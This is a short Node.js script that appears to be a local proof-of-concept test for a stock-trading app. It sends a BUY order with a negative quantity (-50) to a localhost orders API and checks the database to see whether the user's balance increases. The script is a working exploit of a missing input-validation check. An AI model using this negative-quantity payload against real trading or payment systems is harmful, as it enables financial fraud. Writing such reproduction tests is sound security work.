const db = require('./db');
const axios = require('axios');

const API_URL = 'http://localhost:3001/api/orders';
const USER_ID = 1; // Existing user

async function runExploit() {
    try {
        console.log(`--- Checking User ${USER_ID} Balance ---`);
        const [rowsBefore] = await db.execute('SELECT balance_fiat FROM users WHERE id = ?', [USER_ID]);
        if (rowsBefore.length === 0) {
            console.log("User 1 not found. Cannot proceed.");
            return;
        }
        const balanceBefore = parseFloat(rowsBefore[0].balance_fiat);
        console.log(`Balance Before: ${balanceBefore}`);

        // 2. Perform Exploit: Negative Quantity
        const payload = {
            user_id: USER_ID,
            stock_symbol: "GOOGL",
            order_type: "BUY",
            price: 100,
            quantity: -50 // Negative Quantity!
        };

        console.log("--- Sending Negative Order (-50 * 100 = -5000) ---");
        try {
            await axios.post(API_URL, payload);
            console.log("Order Placed (Request succeeded)");
        } catch (e) {
            console.log("Order Request Failed:", e.response?.data || e.message);
        }

        // 3. Check Balance
        const [rowsAfter] = await db.execute('SELECT balance_fiat FROM users WHERE id = ?', [USER_ID]);
        const balanceAfter = parseFloat(rowsAfter[0].balance_fiat);
        console.log(`Balance After: ${balanceAfter}`);

        const delta = balanceAfter - balanceBefore;
        if (delta > 0) {
            console.log("!!! VULNERABILITY CONFIRMED: Balance Increased !!!");
            console.log(`Gained: ${delta}`);
        } else {
            console.log(`Balance change: ${delta}. Vulnerability not reproduced.`);
        }

    } catch (err) {
        console.error("Test Error:", err);
    } finally {
        process.exit();
    }
}

runExploit();
